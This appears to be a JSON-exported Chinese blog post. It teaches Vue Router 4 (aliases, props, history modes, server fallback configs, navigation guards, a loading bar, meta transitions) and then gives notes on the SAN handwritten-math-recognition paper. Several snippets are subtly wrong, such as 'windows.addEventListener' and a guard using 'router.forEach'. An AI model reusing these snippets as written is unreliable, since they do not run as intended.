&#123; // 将总是把/users/123/posts重定向到/users/123/profile。 path: &#x27;/users/:id/posts&#x27;, redirect: to =&gt; &#123; // 该函数接收目标路由作为参数 // 相对位置不以`/`开头 // 或 &#123; path: &#x27;profile&#x27;&#125; return &#x27;profile&#x27; &#125;, &#125;,] 别名 重定向是指当用户访问 /home 时，URL 会被 / 替换，然后匹配成 /。那么什么是别名呢？ 将 / 别名为 /home，意味着当用户访问 /home 时，URL 仍然是 /home，但会被匹配为用户正在访问 /。 上面对应的路由配置为： 1const routes = [&#123; path: &#x27;/&#x27;, component: Homepage, alias: &#x27;/home&#x27; &#125;] 通过别名，你可以自由地将 UI 结构映射到一个任意的 URL，而不受配置的嵌套结构的限制。使别名以 / 开头，以使嵌套路径中的路径成为绝对路径。你甚至可以将两者结合起来，用一个数组提供多个别名： 12345678910111213const routes = [ &#123; path: &#x27;/users&#x27;, component: UsersLayout, children: [ // 为这 3 个 URL 呈现 UserList // - /users // - /users/list // - /people &#123; path: &#x27;&#x27;, component: UserList, alias: [&#x27;/people&#x27;, &#x27;list&#x27;] &#125;, ], &#125;,] 如果你的路由有参数，请确保在任何绝对别名中包含它们： 12345678910111213const routes = [ &#123; path: &#x27;/users/:id&#x27;, component: UsersByIdLayout, children: [ // 为这 3 个 URL 呈现 UserDetails // - /users/24 // - /users/24/profile // - /24 &#123; path: &#x27;profile&#x27;, component: UserDetails, alias: [&#x27;/:id&#x27;, &#x27;&#x27;] &#125;, ], &#125;,] SEO 关于 SEO 的注意事项: 使用别名时，一定要定义规范链接. 将props传递给路由组件 在你的组件中使用 $route 会与路由紧密耦合，这限制了组件的灵活性，因为它只能用于特定的 URL。虽然这不一定是件坏事，但我们可以通过 props 配置来解除这种行为： 我们可以将下面的代码 1234const User = &#123; template: &#x27;&lt;div&gt;User &#123;&#123; $route.params.id &#125;&#125;&lt;/div&gt;&#x27;&#125;const routes = [&#123; path: &#x27;/user/:id&#x27;, component: User &#125;] 替换为: 123456const User = &#123; // 请确保添加一个与路由参数完全相同的 prop 名 props: [&#x27;id&#x27;], template: &#x27;&lt;div&gt;User &#123;&#123; id &#125;&#125;&lt;/div&gt;&#x27;&#125;const routes = [&#123; path: &#x27;/user/:id&#x27;, component: User, props: true &#125;] 布尔模式 当 props 设置为 true 时，route.params 将被设置为组件的 props。 命名视图 对于有命名视图的路由，你必须为每个命名视图定义 props 配置： 1234567const routes = [ &#123; path: &#x27;/user/:id&#x27;, components: &#123; default: User, sidebar: Sidebar &#125;, props: &#123; default: true, sidebar: false &#125; &#125;] 对象模式 当 props 是一个对象时，它将原样设置为组件 props。当 props 是静态的时候很有用。 1234567const routes = [ &#123; path: &#x27;/promotion/from-newsletter&#x27;, component: Promotion, props: &#123; newsletterPopup: false &#125; &#125;] 函数模式 你可以创建一个返回 props 的函数。这允许你将参数转换为其他类型，将静态值与基于路由的值相结合等等。 1234567const routes = [ &#123; path: &#x27;/search&#x27;, component: SearchUser, props: route =&gt; (&#123; query: route.query.q &#125;) &#125;] URL /search?q=vue 将传递 &#123;query: 'vue'&#125; 作为 props 传给 SearchUser 组件。 请尽可能保持 props 函数为无状态的，因为它只会在路由发生变化时起作用。如果你需要状态来定义 props，请使用包装组件，这样 vue 才可以对状态变化做出反应。 不同历史模式 在创建路由器实例时，history 配置允许我们在不同的历史模式中进行选择。 Hash模式 hash 模式是用 createWebHashHistory() 创建的： 12345678import &#123; createRouter, createWebHashHistory &#125; from &#x27;vue-router&#x27;const router = createRouter(&#123; history: createWebHashHistory(), routes: [ //... ],&#125;) 它在内部传递的实际 URL 之前使用了一个哈希字符（#）。由于这部分 URL 从未被发送到服务器，所以它不需要在服务器层面上进行任何特殊处理。不过，它在 SEO 中确实有不好的影响。如果你担心这个问题，可以使用 HTML5 模式。 该模式是通过locations中的方法实现跳转的： 1location.hash = &#x27;/reg&#x27; 而浏览器的前进后退事件则是通过： 123windows.addEventListener(&quot;hashchange&quot;, (e) =&gt; &#123; console.log(e)&#125;) 事件进行监听 HTML5 模式 用 createWebHistory() 创建 HTML5 模式，推荐使用这个模式： 12345678import &#123; createRouter, createWebHistory &#125; from &#x27;vue-router&#x27;const router = createRouter(&#123; history: createWebHistory(), routes: [ //... ],&#125;) 当使用这种历史模式时，URL 会看起来很 “正常”，例如 https://example.com/user/id 不过，问题来了。由于我们的应用是一个单页的客户端应用，如果没有适当的服务器配置，用户在浏览器中直接访问 https://example.com/user/id，就会得到一个 404 错误。这就尴尬了。要解决这个问题，你需要做的就是在你的服务器上添加一个简单的回退路由。如果 URL 不匹配任何静态资源，它应提供与你的应用程序中的 index.html 相同的页面。 该模式通过h5新增的对象history实现路由切换 1history.pushState(&#123;state: 1&#125;, &quot;&quot;, &quot;/reg&quot;) 但直接使用该方法进行页面跳转不会触发popstate事件 监听前进后退事件则是通过popstate事件进行： 123windows.addEventListener(&quot;popstate&quot;, (e) =&gt; &#123; console.log(e)&#125;) 服务器配置示例 注意：以下示例假定你正在从根目录提供服务。如果你部署到子目录，你应该使用Vue CLI 的 publicPath 配置和相关的路由器的 base 属性。你还需要调整下面的例子，以使用子目录而不是根目录（例如，将RewriteBase/ 替换为 RewriteBase/name-of-your-subfolder/）。 Apache 123456789101112&lt;IfModule mod_negotiation.c&gt; Options -MultiViews&lt;/IfModule&gt;&lt;IfModule mod_rewrite.c&gt; RewriteEngine On RewriteBase / RewriteRule ^index\\.html$ - [L] RewriteCond %&#123;REQUEST_FILENAME&#125; !-f RewriteCond %&#123;REQUEST_FILENAME&#125; !-d RewriteRule . /index.html [L]&lt;/IfModule&gt; 也可以使用 FallbackResource 代替 mod_rewrite。 nginx 123location / &#123; try_files $uri $uri/ /index.html;&#125; 原生Node.js 123456789101112131415161718192021const http = require(&#x27;http&#x27;)const fs = require(&#x27;fs&#x27;)const httpPort = 80http .createServer((req, res) =&gt; &#123; fs.readFile(&#x27;index.html&#x27;, &#x27;utf-8&#x27;, (err, content) =&gt; &#123; if (err) &#123; console.log(&#x27;We cannot open &quot;index.html&quot; file.&#x27;) &#125; res.writeHead(200, &#123; &#x27;Content-Type&#x27;: &#x27;text/html; charset=utf-8&#x27;, &#125;) res.end(content) &#125;) &#125;) .listen(httpPort, () =&gt; &#123; console.log(&#x27;Server listening on: http://localhost:%s&#x27;, httpPort) &#125;) … Caveat 这有一个注意事项。你的服务器将不再报告 404 错误，因为现在所有未找到的路径都会显示你的 index.html 文件。为了解决这个问题，你应该在你的 Vue 应用程序中实现一个万能的路由来显示 404 页面。 1234const router = createRouter(&#123; history: createWebHistory(), routes: [&#123; path: &#x27;/:pathMatch(.*)&#x27;, component: NotFoundComponent &#125;],&#125;) 另外，如果你使用的是 Node.js 服务器，你可以通过在服务器端使用路由器来匹配传入的 URL，如果没有匹配到路由，则用 404 来响应，从而实现回退。查看 Vue 服务器端渲染文档了解更多信息。 路由守卫 守卫可以在任何位置使用router进行添加 前置守卫 12345678910111213141516171819const router = useRouter()// 定义一个白名单用于保证首页的正常访问const whiteList = [&#x27;/&#x27;]// 前置守卫会在每一次路由跳转时触发// 回调函数包含三个参数：// to: 目的URL// from: 起点URL// next: 下一步操作函数（如果还有别的前置守卫，则该函数为下个一个守卫处理函数，如果没有该函数为实际跳转操作函数router.forEach((to, from, next) =&gt; &#123; if(whiteList.includes(to) || localStorage.getItem(&quot;token&quot;)) &#123; // 在白名单中，或登陆过保存了token凭证则进行跳转 next() &#125; else &#123; // 否则跳转到路径 next(&quot;/&quot;) &#125;&#125;) 后置守卫 后置守卫会在跳转完成之后执行，我们可以利用前置和后置两个守卫来实现一个加载进度条的功能： 先准备好进进度条组件： loadingBar.vue 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;template&gt; &lt;div class=&quot;wraps&quot;&gt; &lt;div ref=&quot;bar&quot; class=&quot;bar&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/template&gt; &lt;script setup lang=&#x27;ts&#x27;&gt;import &#123; ref, onMounted &#125; from &#x27;vue&#x27;let speed = ref&lt;number&gt;(1)let bar = ref&lt;HTMLElement&gt;()let timer = ref&lt;number&gt;(0)const startLoading = () =&gt; &#123; let dom = bar.value as HTMLElement; speed.value = 1 // 使用Windows.requestAnimationFrame不会触发多次回流与重绘，浏览器会收集这些操作，并最最后触发一次重绘，并且会以60帧显示 // 如果使用interval每一次调用都会触发回流与重绘 timer.value = window.requestAnimationFrame(function fn() &#123; if (speed.value &lt; 90) &#123; speed.value += 1; dom.style.width = speed.value + &#x27;%&#x27; timer.value = window.requestAnimationFrame(fn) &#125; else &#123; speed.value = 1; // 使用cancleAnimationFrame取消事件绑定 window.cancelAnimationFrame(timer.value) &#125; &#125;) &#125; const endLoading = () =&gt; &#123; let dom = bar.value as HTMLElement; setTimeout(() =&gt; &#123; window.requestAnimationFrame(() =&gt; &#123; speed.value = 100; dom.style.width = speed.value + &#x27;%&#x27; &#125;) &#125;, 500) &#125; // 向外暴露两个方法用于开启和结束进度条defineExpose(&#123; startLoading, endLoading&#125;)&lt;/script&gt; &lt;style scoped lang=&quot;less&quot;&gt;.wraps &#123; position: fixed; top: 0; width: 100%; height: 2px; .bar &#123; height: inherit; width: 0; background: blue; &#125;&#125;&lt;/style&gt; main.ts 12345678910111213141516171819import loadingBar from &#x27;./components/loadingBar.vue&#x27;import &#123;createVNode, render&#125; from &quot;vue&quot;const router = useRouter()// 挂载部分可以抽离为单独的ts文件// 全局添加进度条组件，注意先要将组件转化为虚拟DOM节点const vNode = createVNode(loadingBar)// 然后使用render全局挂载render(vNode, document.body)router.beforeEach((to, from, next) =&gt; &#123; // 跳转页面前调用开启进度条方法 vNode.component?.exposed?.startLoading()&#125;)router.afterEach((to, from) =&gt; &#123; // 跳转结束后调用结束进度条方法 vNode.component?.exposed?.endLoading()&#125;) 路由原信息 通过路由记录的 meta 属性可以定义路由的元信息。使用路由元信息可以在路由中附加自定义的数据，例如： 权限校验标识。 路由组件的过渡名称。 路由组件持久化缓存 (keep-alive) 的相关配置。 标题名称 我们可以在导航守卫或者是路由对象中访问路由的元信息数据。 1234567891011121314151617181920212223242526// 如果不使用扩展 meta中的属性将会推断为unknow 类型declare module &#x27;vue-router&#x27; &#123; interface RouteMeta &#123; title?: string &#125;&#125;const router = createRouter(&#123; history: createWebHistory(import.meta.env.BASE_URL), routes: [ &#123; path: &#x27;/&#x27;, component: () =&gt; import(&#x27;@/views/Login.vue&#x27;), meta: &#123; title: &quot;登录&quot; &#125; &#125;, &#123; path: &#x27;/index&#x27;, component: () =&gt; import(&#x27;@/views/Index.vue&#x27;), meta: &#123; title: &quot;首页&quot;, &#125; &#125; ] 路由跳转动效 可以利用meta信息为组件添加一些过度动效，直接将动效的名称放在meta中，这里使用的时Animate.css动效库： 1234567891011121314151617181920212223242526272829declare module &#x27;vue-router&#x27;&#123; interface RouteMeta &#123; title:string, transition:string, &#125;&#125; const router = createRouter(&#123; history: createWebHistory(import.meta.env.BASE_URL), routes: [ &#123; path: &#x27;/&#x27;, component: () =&gt; import(&#x27;@/views/Login.vue&#x27;), meta:&#123; title:&quot;登录页面&quot;, transition:&quot;animate__fadeInUp&quot;, &#125; &#125;, &#123; path: &#x27;/index&#x27;, component: () =&gt; import(&#x27;@/views/Index.vue&#x27;), meta:&#123; title:&quot;首页！！！&quot;, transition:&quot;animate__bounceIn&quot;, &#125; &#125; ]&#125;) 然后router4.X的router-view组件支持插槽，可以在插槽中引入动效标签： 1234567&lt;!-- 插槽接收两个返回值 分别代表目前页面的路由信息以及当前显示的组件 --&gt;&lt;router-view #default=&quot;&#123;route,Component&#125;&quot;&gt; &lt;!-- 将路由信息中的meta.transition动效名称拼接放到animate中即可 --&gt; &lt;transition :enter-active-class=&quot;`animate__animated $&#123;route.meta.transition&#125;`&quot;&gt; &lt;component :is=&quot;Component&quot;&gt;&lt;/component&gt; &lt;/transition&gt;&lt;/router-view&gt;","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"Vue","slug":"前端/Vue","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/Vue/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"前端框架","slug":"前端框架","permalink":"http://enderxiao.github.io/tags/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6/"},{"name":"Vue","slug":"Vue","permalink":"http://enderxiao.github.io/tags/Vue/"}]},{"title":"SAN论文阅读","slug":"SAN论文阅读","date":"2023-04-07T11:48:31.000Z","updated":"2024-07-30T11:26:33.914Z","comments":true,"path":"2023/04/07/SAN论文阅读/","permalink":"http://enderxiao.github.io/2023/04/07/SAN%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"在OCR识别中引入树形编码器，从而加入更多语义信息","text":"在OCR识别中引入树形编码器，从而加入更多语义信息 摘要 本文将语义信息融入ORC任务，具体来说本文提出了一套语法规则，用于将每个表达式的LaTeX标签转化为解析树，接着本文使用神经网络将标记序列预测任务建模为一个树遍历过程。因此本文提出的方法可以有效地描述表达式的语法上下文，缓解HMER的结构预测误差。在两个基准数据集上的实验表明，我们的方法取得了比现有方法更好的识别性能。为了进一步验证我们方法的有效性，我们创建了一个由来自一万个作者的100k张手写数学表达式图像组成的大规模数据集。 引言 随着深度学习方法的发展，在图像到序列的方法中，现有方案更商场与处理文本行。但是这些方法也许在对复杂结构的处理上效果不佳，例如处理数学表达式。本文调查了离线手写数学表达式识别（HMER）。HMER任务的难点在于二维结构关系对于数学公式的理解是非常重要的，但这一点再以往的基于深度学习的方法中很少被考虑到。此外，手写输入带来的歧义进一步增加了HMER的难度。 早期的工作已经很好地研究了ME的语法结构，并为HMER定义了合适的语法。这些语法仅用于将识别出的符号分组为结构化输出，严重依赖于符号识别的性能。此外，由于这些方法主要是基于手工特征设计的，其性能远远达不到实际应用的要求。 最近的编解码器或多或少都忽略了数学公式的语法信息。本文使用了WAP模型以及DWAP-TD模型来说明这一点。DWAP-TD模型尝试通过将目标句法结构树分解为一系列子树来考虑语法信息，其中每个子树由父节点和子节点组成。尽管DWAP - TD可以产生树结构的输出，但它仍然遵循&quot;从一个字符到另一个字符&quot;的范式，即下一个符号预测主要基于当前符号。本文认为，这类方法在学习过程中没有明确地考虑ME的语法关系，缺乏生成合理的树预测的语法约束。 为了解决结构误差并提升复杂语法树的理解，本文提出了一个语法精炼模块，可以自然地将语法树划分为不同的组件，有效地减少树结构歧义。 然后，本文建立了一个名为句法语义感知网络( SAN )的编码器-解码器网络，该网络将语法约束和特征学习融合在一个统一的框架中。 如图上图 ( c )所示，SAN的预测过程遵循语法树的遍历过程，语法树的子树是数学表达式的重要组成部分。通过这种方式，可以在提出的SAN模型中对相邻组件的句法关系进行编码。因此，SAN的预测是在解析过程中从一个组件到另一个组件进行的。 除了使用CROHME数据集外，为了进一步确认SAN的有效性，我们收集并注释了一个用于评估的大规模数据集，命名为HME100K。该数据集的数据量是CHROME的十倍。 本文的主要贡献在于提出的句法语义感知网络，首次有效地将句法信息嵌入到深度神经网络中。本文的另一个贡献是提出了大型多样的数据集HME100K。与先前的数据集相比，HME数据集拥有更多的长度，具有更多复杂结构，对于提升算法在真实数据上的鲁棒性更为有效。 结论 本文提出了一种非传统的手写数学表达式识别方法，通过结合语法信息和视觉表示来进行稳健的预测。据我们所知，提出的句法语义感知网络是第一个有效地将语法规则纳入深度特征学习的网络。本文的方法不仅可以预测LaTeX标记结果，而且可以直接生成树结构输出，可以精确地描述数学表达式的组成关系。在基准数据集和提出的HME100K数据集上的实验验证了本文方法的有效性和效率。 相关工作 最近的研究表明HMER可以分为三个主要的挑战任务： 对同一字符的笔画进行分割分组 识别符号 根据语法直到的符号结构关系分析来生成数学表达式。 传统的HMER方法试图顺序地和全局地解决这些挑战。 序列式的方法首先将输入表达式分割成数学符号，对每个符号分别进行分类，然后进行结构关系分析识别出数学表达式。这些方法使用了例如HMM、弹性匹配(Elastic Matching)、支持向量(SVM)机以及树变换(Tree transformation)。 另一些使用全集方案的方法使用了综合策略学习数学符号并分析其结构关系同时对符号进行隐式分割。这类方法将HMER任务视为一个对数学表达式分割、符号识别、基于符号识别结果构的识别表达式结构的全局任务。 现有深度学习的HMER方法能够粗略的分为几类： seq2seq tree-structure 大多数的方法使用seq2seq的方法，其中的一些方法基于注意力的seq2seq模型将手写数学公式的转化为代表性标记语言LaTeX。最近，Wu等人设计了一个graph-to-graph的模型，能够发掘输入的HME和输出标记的结构关系，从而提高识别效果。 Seq2Seq的方法能够提升HMER的表现，但由于其继承的一维性，它缺乏对句法关系的敏感性，从而导致无法避免的预测误差。 基于树结构的方法使用了树结构解码器对数学表达式树的父子关系进行显示建模。 例如为了识别在线的HME，Zhang提出了一种基于BLSTM的树形结构，同时Zhang等人提出了基于树形结构的序列关系解码器(SRD)，另一方面，为了识别离线的HME，Zhang等人提出了一种树结构解码器，试图通过将目标句法结构树分解为子树序列来考虑语法信息，其中每个子树都有父子关系。通常，与字符串解码器相比，树结构解码器表现出更好的鲁棒性。然而现有的树结构解码器存在两个局限性： 深度网络特征学习中语法信息缺乏整体性表征。 这些方法在理论上试图考虑句法信息；然而，在实践中，他们无法摆脱序列到序列串解码方案的恶性循环。 HMER的难点主要在于考虑句法关系的复杂性，而不是符号识别。因此本文提出了一种配备语法规则的新型神经网络架构，能够高效地将语法树划分为不同的组件，以缓解树结构歧义带来的错误。该方法基于语法规则学习结构之间的语法关系，并根据结构关系指导语法树创建构件。本文的工作与现有树结构方法的关键区别在于： SAN将句法约束表示融入到深度神经网络特征学习中。 本文的方法是一种整体的句法语义感知方法，可以准确地识别和定位具有复杂结构关系的ME组件。 SAN通过将一个组件解析到另一个组件而不是单独的父节点和子节点，最大限度地减少了高昂的计算成本。 如下图所示，SAN定位和识别了具有复杂结构关系的ME中的组件，然而DWAP-TD忽略了ME中的一些组件。 方法 SAN SAN定义如下： G=(N,Σ,R,S,Γ,C,D)G = (N, \\Sigma, R, S,\\Gamma,C,D )G=(N,Σ,R,S,Γ,C,D) 一个包含7个元素的tuple。 NNN：非终结符有限集 Σ\\SigmaΣ：终结符有限集 RRR：产生规则有限集 SSS：开始符 Γ\\GammaΓ：关系有限集 CCC：encoder DDD：decoder 本文设计了语法规则，该规则包含两项约束： 遵循标准的阅读顺序：从左到右，从上到下 利用了相邻符号之间的空间关系 对于HME中一对相邻的符号，共有9中可能的关系：左、右、上、下、左下、右下、左上、右上、内部。但由于约束1的存在，本文删除了其中的“左”和“左下”。尽管一个ME可能对应不同的LaTex序列，但由于这两项约束的存在，本文的语法规则生成的语法树是相同的 SAN将图像转化为解析树，其中叶子节点为终结符号或关系，其他为非终结符号。目前有两种非终结符S和E，S为开始符，并且将座位树的根节点。终结符Σ\\SigmaΣ包含所有可能在LaTeX表达式种使用的符号。 R产生规则能被用在构建解析树上。产生规则的形式为：α→β where α∈N,β∈(Γ∪N∪Σ)∗\\alpha \\to \\beta \\ where \\ \\alpha \\in N, \\beta \\in (\\Gamma \\cup N \\cup \\Sigma)*α→β where α∈N,β∈(Γ∪N∪Σ)∗其中*表示Kleene star操作。因此父节点α\\alphaα能被分解为一个子节点β\\betaβ的结合，包含非终结符、终结符和关系。 R包含两个产生规则： 一个S能够产生：S→σS∣E∣ϵS \\to \\sigma S|E|\\epsilonS→σS∣E∣ϵ 任意一个终结符号其右边跟着一个S 一个E 一个空字符串表示为ϵ\\epsilonϵ σ∈Σ\\sigma \\in \\Sigmaσ∈Σ表示任意一个终结符 |分离备选方案 一个E能产生：E→[((γ1)S∣ϵ),...,((γ7)S∣ϵ)]E \\to [((\\gamma _1)S|\\epsilon),...,((\\gamma_7)S|\\epsilon)]E→[((γ1​)S∣ϵ),...,((γ7​)S∣ϵ)] 为每种类型的关系建立一个字符串，然后将它们连接起来 字符串可以是S后面的关系，也可以是空串 γi∈Γ\\gamma _i \\in \\Gammaγi​∈Γ代表第i个关系 [.][.][.]是连接运算符 如下图a所示是一个公式∑ina\\sum ^n _i a∑in​a的产生过程： 产生式规则与输入图像和父节点的上下文状态条件概率相关联，条件概率表示如下： p(α→β∣c(α),X)=Dα→β(c(α),E(x))p(\\alpha \\to \\beta|c(\\alpha), X) = D_{\\alpha \\to \\beta}(c(\\alpha), E(x))p(α→β∣c(α),X)=Dα→β​(c(α),E(x)) X代表输入图像，E(X)是encoder的输出，c(α)c(\\alpha)c(α)是α\\alphaα的上下文信息，Dα→β(.)D_{\\alpha \\to \\beta}(.)Dα→β​(.)是decoder的输出与生产规律相对应。 一个SAN的处理过程如下图所示： 其中树的遍历用一个栈来实现，用以保证训练过程是按照遍历顺序执行的。同样的预测过程也是通过栈来实现。一但找到解析树，识别的结果可以通过先序遍历解析树得到。 Encoder DenseNet Syntax-Aware Decoder 主要包含两个GRU单元，和一个Syntax-Aware Attention模块。Decoder的输入输出如下： input：一个非终结符α\\alphaα的上下文状态，encoder向量E(X)E(X)E(X) output：以α\\alphaα开始的每个产生式的概率 本文使用历史状态和伙伴状态来描述当前解析非终端符号的上下文状态。历史状态chαc^\\alpha _hchα​用来追踪非终端节点α\\alphaα是如何产生的。此外，将最新生成的终端符号或关系的word embedding作为非终端符号的伙伴状态cpαc^\\alpha _pcpα​来捕获短期上下文信息。 decoder模型结构如下： GRU−αGRU-\\alphaGRU−α输入：cpαc_p ^\\alphacpα​座位输入向量，chαc_h ^\\alphachα​做为隐藏向量，输出一个新的隐藏向量coαc_o ^ \\alphacoα​ coα=GRU(cpα,chα)c_o^\\alpha = GRU(c_p^\\alpha,c_h^\\alpha)coα​=GRU(cpα​,chα​) 随后一个注意力模块计算一个紧凑的视觉特征，使用attα(X)att_\\alpha(X)attα​(X)SAA的输出向量、encoder输出的特征、隐藏向量作为输入计算注意力： Ω=Att(E(X),coα,attα(X))\\Omega = Att(E(X), c_o^\\alpha, att_\\alpha(X))Ω=Att(E(X),coα​,attα​(X)) 第二个GRU使用Ω\\OmegaΩ作为输入向量，coαc_o ^\\alphacoα​作为隐藏向量，输出新的隐藏向量cβαc_\\beta ^\\alphacβα​： cβα=GRU(Ω,coα)c_\\beta ^\\alpha = GRU(\\Omega, c_o ^\\alpha)cβα​=GRU(Ω,coα​) 随后本模型整合cpα,cβα,Ωc_p ^\\alpha, c_\\beta ^ \\alpha , \\Omegacpα​,cβα​,Ω来预测两个概率分支： psymbol(α→β∣c(α),X)=softmax(Ws(Wpcpα+Wgcβα+WtΩ))prelation(α→β∣c(α),X)=softmax(Wr(Wpcpα+Wgcβα+WtΩ))p_{symbol}(\\alpha \\to \\beta | c(\\alpha), X) = softmax(W_s(W_pc_p^\\alpha + W_gc_\\beta ^\\alpha + W_t \\Omega)) \\\\ p_{relation}(\\alpha \\to \\beta | c(\\alpha), X) = softmax(W_r(W_pc_p^\\alpha + W_gc_\\beta ^\\alpha + W_t \\Omega))psymbol​(α→β∣c(α),X)=softmax(Ws​(Wp​cpα​+Wg​cβα​+Wt​Ω))prelation​(α→β∣c(α),X)=softmax(Wr​(Wp​cpα​+Wg​cβα​+Wt​Ω)) 其中W代表权重。psymbol(α→β∣c(α),X)p_{symbol}(\\alpha \\to \\beta | c(\\alpha), X)psymbol​(α→β∣c(α),X)是一个包含∣Σ∣+2|\\Sigma| + 2∣Σ∣+2个维度的概率向量来表示三种情况： ∣Σ∣|\\Sigma|∣Σ∣个维度用来表示预测的符号 一个维度用来表示预测E 最后一个维度用来预测空字符串 对于第一种场景，如果对终端符号(σ)( \\sigma )(σ)的预测概率最高，那么应用S→σSS\\to \\sigma SS→σS的规则更新解析树，使用σ\\sigmaσ的词嵌入作为新生成S的伙伴状态,cβαc_\\beta ^\\alphacβα​作为其历史状态。 对于第二种场景，如果预测到E的概率最高，则应用Prelation(α→β∣c(α)，X)P_{relation}( \\alpha \\to \\beta | c ( \\alpha)，X )Prelation​(α→β∣c(α)，X)预测每个关系出现的概率。概率高于0.5的关系是持续的，其他的被抛弃。对于每一个剩余关系，我们使用关系的嵌入作为后面S的伙伴状态，使用cβαc_\\beta ^\\alphacβα​作为历史状态。此外，不需要考虑解析一个E，因为它已经从关系分支中获取。对于第三种情况，如果空字符串出现的概率最高，则按照S→ϵS \\to \\epsilonS→ϵ的规则更新解析树。 SAA Module 该模块通过注意力机制计算出紧凑的视觉特征。 首先计算出图像每个局部区域的归一化权重，然后使用加权平均对局部特征进行聚合。本文使用E(X)E(X)E(X)，隐藏状态coαc_o ^ \\alphacoα​和一个syntax-aware attention向量attα(X)att_\\alpha (X)attα​(X)来计算归一化权重向量： ξα=softmax(Ww(tanh(Wocoα+Wαattα(X)+WeE(x))))\\xi _\\alpha = softmax(W_w(tanh(W_o c_o ^ \\alpha + W_\\alpha att_\\alpha (X) + W_e E(x))))ξα​=softmax(Ww​(tanh(Wo​coα​+Wα​attα​(X)+We​E(x)))) 其中W是科学系参数，ξα\\xi _ \\alphaξα​是一个长度为L的向量。随后通过矩阵乘法计算得到的紧凑的视觉特征 Att(E(X),coα,attα(X))=E(x)ξαAtt(E(X),c_o ^ \\alpha , att_\\alpha(X)) = E(x) \\xi _ \\alphaAtt(E(X),coα​,attα​(X))=E(x)ξα​ 不同于以往的使用基于所有过去注意力概率之和的覆盖向量，SAN不跟踪所有过去的注意力概率。 注意力漂移问题的发生是因为分子的注意力概率没有给出解析分母的信息，而是表现为噪声。本文将从解析树的根到当前解析节点的路径上过去的注意力概率加总，而不是所有过去的注意力概率。因此本文通过如下方式计算注意力向量： attα(X)=∑iξi,i∈pathαatt_\\alpha (X) = \\sum _i \\xi_i, i \\in path_\\alphaattα​(X)=∑i​ξi​,i∈pathα​ 通过将句法语义感知注意力向量作为中间信息存储在堆栈中，可以有效地对其进行追踪。 采用注意力自正则化策略对注意力进行修正。本文使用一个额外的反向解码器来预测每个给定子节点的父节点。反向解码器与原始解码器结构相同，但对数据进行反向操作。因此有两个标准化的权重向量来预测每个非终端节点β\\betaβ，正向ξα\\xi_\\alphaξα​和反向ξβ\\xi _\\betaξβ​，其中α\\alphaα是β\\betaβ的父节点，β\\betaβ是η\\etaη的父节点。本文使用KullbackLeibler ( KL )散度来对其进行正则化正则： Lreg=−∑βξβ^logξη^ξαL_{reg} = -\\sum_\\beta \\hat{\\xi _\\beta}log\\frac{\\hat{\\xi_\\eta}}{\\xi _\\alpha}Lreg​=−∑β​ξβ​^​logξα​ξη​^​​ 反向解码器与SAN联合训练，但在推理过程中省略，以跳过额外的推理时间。 训练 SAN的训练目标是最小化以下损失的和： symbol loss(LsymbolL_{symbol}Lsymbol​) relation loss(LrelationL_{relation}Lrelation​) reverse symbol loss(LsymbolrevL_{symbol}^{rev}Lsymbolrev​) attention self-regularization loss(LregL_{reg}Lreg​) 本文使用教师强制策略来加速收敛。通过深度优先搜索算法对LaTeX序列进行解析，得到每张训练图像的真值解析树，以便于从解析树种获取父子样本列表。随后根据树的先序遍历处理每一个样本，知道整棵树遍历完。同时本文使用反向decoder来预测每个子节点的父节点。然后使用真实标签计算symbol、reverse symbol、relation的损失。而attention self-regularization loss使用上文种提到的LregL_{reg}Lreg​公式计算得到。于是，参数的更新就是通过最小化以下公式进行： L=Lsymbol+Lrelation+Lsymbolrev+LregL= L_{symbol} + L_{relation} + L_{symbol}^{rev} + L_{reg}L=Lsymbol​+Lrelation​+Lsymbolrev​+Lreg​ 实验 使用CROHME与本文提出的HME100K两个数据集上进行了对比实验，本文提出的模型达达了SOTA 实验采用表达式识别率ExpRate对模型进行评估，定义为预测的数学表达式与真实值精确匹配的百分比，ExpRate≤1ExpRate \\leq 1ExpRate≤1和ExpRate≤2ExpRate \\leq 2ExpRate≤2表示表达式识别率允许最多1或2个符号级别的错误 结构识别采用表达式结构预测率( ESPR )作为结构识别协议。ESPR由不考虑符号标签的ME结构被正确识别的百分比计算得到。 对比实验结果如下： 对于HME100K数据集而言，考虑到数学公式结构复杂度（SC），字符长度（CL）将显著影响模型的能力，本文将模型分为了三个难度： {Easy,S.C.∈[0,1]&amp;C.L.∈[1,10]Moderate,S.C.∈[0,1]&amp;C.L.∈[10,20]Hard,otherwise\\begin{cases} Easy, &amp;S.C. \\in [0,1] \\&amp; C.L. \\in [1, 10] \\\\ Moderate, &amp;S.C. \\in [0,1] \\&amp; C.L. \\in [10, 20] \\\\ Hard, &amp;otherwise \\end{cases}⎩⎪⎪⎨⎪⎪⎧​Easy,Moderate,Hard,​S.C.∈[0,1]&amp;C.L.∈[1,10]S.C.∈[0,1]&amp;C.L.∈[10,20]otherwise​ 消融实验 本文消融实验主要分析了语法分析和语法感知注意力模块的影响。SAN为默认模型，SAN-GS为将语法感知模块替换为覆盖注意力机制后的模型。 实验结果如下： 作者还比较累覆盖注意力和语法杆子注意力在一个确定的公式上的效果： 局限性 手写表达式的扭曲和粘连，仍然会导致模型的过翻译和欠翻译。 附录 Kleene star为克林闭包： {“ab”,“c”}* = { ε, “ab”, “c”, “abab”, “abc”, “cab”, “cc”, “ababab”, “ababc”, “abcab”, “abcc”, “cabab”, “cabc”, “ccab”, “ccc”, 